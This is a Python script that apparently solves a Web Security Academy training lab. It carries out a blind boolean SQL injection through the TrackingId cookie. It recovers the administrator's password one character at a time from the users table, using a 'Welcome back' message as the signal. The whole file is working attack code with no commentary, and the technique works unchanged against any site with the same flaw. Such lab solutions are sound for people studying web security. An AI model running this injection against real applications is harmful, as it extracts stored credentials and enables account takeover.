import requests 
import string

url = 'https://0aa6008103f3c76680490889000100fd.web-security-academy.net/'
cookie = {
    "TrackingId": "34Gb1KL8IoMOnJdf",
    "session": "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y"
}

allstring = string.ascii_lowercase + string.digits

track_id = cookie["TrackingId"]

client = requests.Session()
paswrd = ""
response = client.get(url,cookies=cookie, timeout=10)
print(response.status_code)
for num in range(1,21):
    for a in allstring:
       payload= (
           f"{track_id}'AND "
           f"(SELECT SUBSTRING(password,{num},1) "
           f"FROM users WHERE username='administrator')='{a}'--"
       )
       cookie = {
           "TrackingId": payload,
           "session" : "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y" 
       }
       response = client.get(url, cookies=cookie,timeout=10)
       if "Welcome back" in response.text:
           paswrd += a
           break
print(paswrd)
